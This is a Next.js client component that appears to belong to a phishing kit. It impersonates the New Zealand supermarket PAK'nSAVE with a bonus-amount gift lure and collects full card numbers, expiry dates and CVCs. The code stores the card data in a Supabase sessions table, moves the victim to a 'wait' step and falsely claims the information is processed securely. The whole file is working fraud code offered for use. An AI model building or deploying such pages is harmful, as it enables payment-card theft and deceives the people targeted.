"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function CardClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [amount, setAmount] = useState<number>(0);
  const [currency, setCurrency] = useState("NZ$");
  const [number, setNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvc, setCvc] = useState("");
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) return;
      const { data } = await supabase.from("sessions").select("amount, form_data").eq("id", sessionId).maybeSingle();
      if (cancelled || !data) return;
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setAmount(data.amount ?? 0);
      if (fd.currency) setCurrency(fd.currency);
      setSessionFormData(fd);
      setNumber(fd.cardNumber ?? "");
      setExpiry(fd.cardExpiry ?? "");
      setCvc(fd.cardCvc ?? "");
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  function formatExpiry(value: string) {
    const digits = value.replace(/\D/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return `${digits.slice(0, 2)}/${digits.slice(2)}`;
  }

  const expiryValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry);
  const cvcValid = /^\d{3,4}$/.test(cvc);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId) return;
    if (!expiryValid) {
      setMsg("Enter a valid expiry date (MM/YY).");
      return;
    }
    if (!cvcValid) {
      setMsg("Enter a valid CVC/CVV (3 or 4 digits).");
      return;
    }
    setSaving(true);
    setMsg(null);

    const nextFormData = {
      ...sessionFormData,
      cardHolder: "",
      cardNumber: number.trim(),
      cardExpiry: expiry.trim(),
      cardCvc: cvc.trim(),
    };
    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait",
        form_data: nextFormData,
      })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Saving failed.");
    else {
      setSessionFormData(nextFormData);
      router.push(stepToPath("wait", sessionId));
    }
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
            Invalid link.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      <div className="pak-form-card w-full max-w-[980px] fade-in">
        <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-10 sm:pb-10 sm:pt-10 lg:px-12">
          <div className="grid gap-7 lg:grid-cols-[minmax(0,1.1fr)_260px] lg:items-start">
            <div className="min-w-0">
              <div className="max-w-[36rem]">
                <h2 className="pak-form-title">{settings.card_title}</h2>
                <p className="pak-form-subtitle mt-3">{settings.card_subtitle}</p>
              </div>

              <div className="pak-form-amount mt-5 w-full max-w-[25rem] px-5 py-4 sm:px-6">
                <div className="pak-form-amount-label">
                  <div>Your</div>
                  <div>Bonus Amount</div>
                </div>
                <div className="pak-form-amount-divider" />
                <div className="pak-form-amount-value">
                  {currency}{amount.toLocaleString("en-NZ")}
                </div>
              </div>
            </div>

            <div className="flex items-start justify-between gap-4 lg:block">
              <img
                src="/form-assets/paknsave-logo-form.png"
                alt="PAK'nSAVE"
                className="h-14 w-14 object-contain sm:h-16 sm:w-16 lg:ml-auto lg:mb-4"
                id="card-brand-logo"
              />
              <img
                src="/form-assets/paknsave-gift-box.png"
                alt=""
                className="h-auto w-24 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-32 lg:w-full lg:max-w-[220px] lg:translate-x-2"
              />
            </div>
          </div>

          <form onSubmit={handleSubmit} className="mt-7 space-y-5 sm:space-y-6">
            <label className="pak-form-label">
              {settings.card_number_label}
              <div className="pak-form-input-wrap">
                <div className="pak-form-input-icon">
                  <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                    <rect x="3" y="6.5" width="18" height="11" rx="2.5" />
                    <path d="M3 10.5h18" />
                  </svg>
                </div>
                <input
                  required
                  inputMode="numeric"
                  className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg tracking-[0.22em]"
                  value={number}
                  onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
                  autoComplete="cc-number"
                />
              </div>
            </label>
            <div className="grid grid-cols-2 gap-4 sm:gap-6">
              <label className="pak-form-label">
                {settings.card_expiry_label}
                <div className="pak-form-input-wrap">
                  <div className="pak-form-input-icon">
                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                      <rect x="3.5" y="5" width="17" height="15" rx="2.5" />
                      <path d="M7.5 3.8v3M16.5 3.8v3M3.5 9.3h17" strokeLinecap="round" />
                    </svg>
                  </div>
                  <input
                    required
                    placeholder="MM/YY"
                    className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg"
                    value={expiry}
                    onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                    autoComplete="cc-exp"
                    inputMode="numeric"
                    maxLength={5}
                  />
                </div>
              </label>
              <label className="pak-form-label">
                {settings.card_cvv_label}
                <div className="pak-form-input-wrap">
                  <div className="pak-form-input-icon">
                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                      <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                      <path d="m9.3 12.1 1.7 1.7 3.7-3.9" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  </div>
                  <input
                    required
                    inputMode="numeric"
                    maxLength={4}
                    className="pak-form-input min-h-[4.5rem] pl-14 pr-4 text-lg tracking-[0.18em]"
                    value={cvc}
                    onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    autoComplete="cc-csc"
                  />
                </div>
              </label>
            </div>

            {!expiryValid && expiry.length > 0 ? (
              <p className="text-xs text-red-400">Expiry date must be in MM/YY format.</p>
            ) : null}

            {!cvcValid && cvc.length > 0 ? (
              <p className="text-xs text-red-400">CVV must contain 3 or 4 digits.</p>
            ) : null}

            {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}

            <div className="flex flex-col gap-4 pt-1 md:flex-row md:items-center md:justify-between">
              <div className="pak-form-security">
                <svg className="h-9 w-9 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                </svg>
                <span>Your information is processed securely.</span>
              </div>

              <button
                type="submit"
                disabled={saving || !expiryValid || !cvcValid}
                className="pak-form-button min-h-[4.25rem] w-full px-6 text-xl md:w-[24rem]"
              >
                {saving ? "Submitting..." : settings.card_button}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
